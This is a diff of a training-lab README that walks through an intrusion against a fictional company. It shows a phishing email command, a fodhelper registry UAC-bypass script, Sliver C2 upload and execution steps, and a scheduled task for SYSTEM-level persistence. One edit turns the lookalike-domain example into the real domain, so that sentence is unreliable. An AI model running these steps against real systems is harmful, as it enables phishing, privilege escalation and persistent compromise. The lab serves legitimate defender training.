@@ -1,8 +1,41 @@
 # Cyber Attack Lifecycle Lab
 
+## Table of Contents
+- [Cyber Attack Lifecycle Lab](#cyber-attack-lifecycle-lab)
+  - [Table of Contents](#table-of-contents)
+  - [Welcome!](#welcome)
+  - [Your Mission](#your-mission)
+  - [Lab Access and Topology](#lab-access-and-topology)
+  - [Reconnaissance](#reconnaissance)
+    - [What about scanning Cruel testing for Open Ports?](#what-about-scanning-cruel-testing-for-open-ports)
+  - [Initial Compromise](#initial-compromise)
+    - [Phishing](#phishing)
+    - [Execution of Malware](#execution-of-malware)
+      - [Information only (why malware detection by EDR  is not easy)](#information-only-why-malware-detection-by-edr--is-not-easy)
+      - [Information only (stagers)](#information-only-stagers)
+    - [Waiting for the C2 connection](#waiting-for-the-c2-connection)
+    - [Execute the stager from the client](#execute-the-stager-from-the-client)
+  - [Command and Control and Pivoting](#command-and-control-and-pivoting)
+    - [Situational Awareness : Learning about the compromised environment.](#situational-awareness--learning-about-the-compromised-environment)
+    - [Getting Garfield AD Credentials](#getting-garfield-ad-credentials)
+    - [Escalating our Privileges on the compromised client (Bypassing Windows UAC)](#escalating-our-privileges-on-the-compromised-client-bypassing-windows-uac)
+    - [Learning about Garfields not-so-private-anymore files.](#learning-about-garfields-not-so-private-anymore-files)
+    - [Pivoting to to other sytems](#pivoting-to-to-other-sytems)
+  - [Attacking the Active Directory Infrastructure](#attacking-the-active-directory-infrastructure)
+    - [Recon of AD with Bloodhound](#recon-of-ad-with-bloodhound)
+    - [Kerberoasting](#kerberoasting)
+    - [Kerberos Brief Intro](#kerberos-brief-intro)
+    - [Getting and cracking the hashes of the privileged service account](#getting-and-cracking-the-hashes-of-the-privileged-service-account)
+    - [Golden Tickets](#golden-tickets)
+  - [Pivoting to the Internal Kubernetes Infrastructure](#pivoting-to-the-internal-kubernetes-infrastructure)
+    - [Exploiting the vulnerable server](#exploiting-the-vulnerable-server)
+  - [Lab Conclusion](#lab-conclusion)
+  - [Lab TODOs](#lab-todos)
+- [Executed entirely in-memory via a C2 PowerShell channel](#executed-entirely-in-memory-via-a-c2-powershell-channel)
+
 ## Welcome!
 
-Welcome to the Feline Cyber attack lifecycle lab! In this lab you will assume the identity of an intruder to learn how intruders work to compromise your infrastructure. We will go through the different stages such as reconnaisance, initial access, lateral movement and persistence and more.
+Welcome to the Feline Cyber attack lifecycle lab! In this lab you will assume the identity of an intruder to learn how intruders work to compromise your infrastructure. We will go through the different stages such as reconnaissance, initial access, lateral movement and persistence and more.
 Suitable audience are CISOs, Security and Network Architects/Engineers.
 
 The lab is not about learning hacking tools or how to create malware bypassing defenses. Rather it explains how an intruder gains access and what the intruder can do. You will also learn that the intruder tries to be very stealthy, avoiding noisy exploitation, scanning and things that would create alarms from your cyber defense systems.
@@ -55,7 +88,7 @@ startlab
 Two of the tabs opened are for linux shell commands.
 We also have one command running a web server on evil and one for running sliver which is our Command and Control (C2) system.
 
-## Reconnaisance
+## Reconnaissance
 
 The intruder's (your) first step is to find out about your target. From their website http://www.crueltesting.com you would already have learned about their disgusting business practices. But you would also have learned about some of their employees, like their CEO and founder (scratchy), their CISO (Schroedinger's) and their Help Desk Director (garfield).
 
@@ -115,9 +148,9 @@ wget -r -p -E -k -np -nH -P /home/localadmin/LAB https://www.crueltesting.com
 Open up firefox and go to http://127.0.0.1, you will see a copy of our target website.
 
 ![Cloned Website](assets/firefoxfakewebsite.png)
-**We cloned the website of Cruel Computing**
+**We cloned the website of Cruel Testing**
 
-The next step for the intruder could be to register a similar domain name to crueltesting.com, (crueltestng.com, crueltesting-updates.com) and use that in the phishing email.
+The next step for the intruder could be to register a similar domain name to crueltesting.com, (crueltesting.com, crueltesting-updates.com) and use that in the phishing email.
 
 We will not bother with that in this lab, but it is important to understand this technique since it is easy to perform and commonly used.
 
@@ -127,7 +160,7 @@ We learned from linkedin that Garfield may be interested in "new opportunities".
 
 Note that the attacker can use AI to help craft persuasive phishing emails (and make phone calls!!).
 
-Fron a shell on evil, type
+From a shell on evil, type
 ```
 sendemail -f trustme.headhunter@felinejobs.com -s 10.0.3.6 -t garfield@crueltesting.com -u "Job oportunity! Free Tunafish: " -m "As we discussed on the phone, check attachment for details" -s 10.0.3.6
 ```
@@ -295,7 +328,7 @@ Back in your sliver session window you will see what garfield typed.
 
 Joy! We now hopefully Garfield's domain password.
 
-### Escalating our Privileges on the comproised client (Bypassing Windows UAC)
+### Escalating our Privileges on the compromised client (Bypassing Windows UAC)
 
 As noted above, our privileges are limited (our implant is running with integrity level medium, we want it to be **high**!!!. This is all because of windows UAC.
 
@@ -310,19 +343,23 @@ New-ItemProperty "Registry::HKCU\Software\Classes\ms-settings\Shell\Open\command
 Start-Process "C:\Windows\System32\fodhelper.exe"
 EOF
 ```
-![Create Bypass file](assets/creating-bypass-file.png
-)
+![Create Bypass file](assets/creating-bypass-file.png)
+**Create powershell script to bypass UAC**
 From the sliver window, we can now upload this file
 
 ```
 upload bypass.ps1
 ```
 ![Uploading Bypass file](assets/upload-bypass.png)
+**Uploading bypass file**
+
 Then we execute the file
 ```
 execute powershell.exe -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; & 'C:\Users\garfield\Desktop\bypass.ps1'"
 ```
 ![Executing bypass file](assets/execute-bypass.png)
+**Executing the bypass file**
+
 You should see a new session appear, this one with a higher integrity. Interact with the new session (sessions -i <number>). From the higher integrity session we can schedule a task.
 
 ```
@@ -334,9 +371,11 @@ And then we can execute it.
 execute -o schtasks /run /tn "NetworkDiagnostics"
 ```
 ![3 sessions](assets/3-sessions.png)
-** The 3 sessions from the windows client, the one from the computer "Client2" is the most privileged.**
+**The 3 sessions from the windows client, the one from the computer "Client2" is the most privileged.**
 
-This will create another session! We will now have 3 sessions as seen by the picture. The initial session with Garfield, another session with Garfield running with **high** integrety which we used to create our 3rd session, running with **system** priority. Since this session runs as a scheduled task, it is also persistent after reboots of the windows machine.
+This will create another session!
+
+We will now have 3 sessions as seen by the picture. The initial session with Garfield, another session with Garfield running with **high** integrety which we used to create our 3rd session, running with **system** priority. Since this session runs as a scheduled task, it is also persistent after reboots of the windows machine.
 
 Interact with the session with system privileges (use sessions -i <session number>) and check your privileges.
 
